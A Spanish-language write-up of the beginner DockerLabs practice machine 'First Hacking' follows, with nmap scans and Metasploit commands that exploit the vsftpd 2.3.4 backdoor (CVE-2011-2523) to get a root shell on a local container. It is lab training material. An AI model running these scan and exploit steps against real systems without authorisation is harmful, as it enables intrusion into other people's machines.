Machine name: First haking
plataforma: https://dockerlabs.es/#/
Dificultad: Muy facil
source: https://mega.nz/file/oCd2VC5D#QfiRoFmZrZ-FjTuyRX9bLw7638fjluwp6jNth7JjXTw

Herramientas:
- [[Ping]]
- [[NMAP]]
- [[Metasploit]]


![[Dockerlabs - FirstHacking - Firsthacking machine.png]]
despliegue:

```sh fold:"Despliegue de la maquina"
sudo bash auto_deploy.sh firsthacking.tar 
```


![[Dockerlabs - FirstHacking - Despliegue.png]]
ping a la IP:
```sh fold:"Ping a la máquina"
ping -c1 172.17.0.2
```

![[Dockerlabs - FirstHacking - Ping para ver conectividad.png]]
TTL: 64 linux

reconocimiento
```sh fold:"Reconocimiento con nmap"
sudo nmap -sS -p- -sC -sV -Pn 172.17.0.2
```

![[Dockerlabs - FirstHacking - Nmpa reconocimiento.png]]

vemos que encontramos el puerto 21
vamos a lanzar un nmap con detalles para el puerto 21
```sh fold:"Reconocimiento con nmap y scrips del puerto 21"
sudo nmap --script "vuln" -p 21 172.17.0.2
```

![[Dockerlabs - FirstHacking - Nmap con exploit al puerto 21.png]]
tenemos la versión 2.3.4 y un cve:CVE-2011-2523
vamos a intentar explotarlo con metasploit

lanzamos metaesploit
buscamos por el CVE y al no encontrarlo buscamos por la versión de FTP:

```sh fold:"metaesploit"
search CVE-2011-2523
search ftp 2.3.4
use 0
set RHOSTS 172.17.0.2
run
```

![[Dockerlabs - FirstHacking - Metasploit encontrando el sploit.png]]


metaesploit configuramos el IP destino:
![[Dockerlabs - FirstHacking - Metaesploit configuracion de la IP del host.png]]m


Una vez configurado el metasploit lanzamos run para lanzar el ataque
![[Dockerlabs - FirstHacking - Correr metaesploit.png]]
conseguimos acceso con el usuario root:

![[Dockerlabs - FirstHacking - Usuario Root.png]]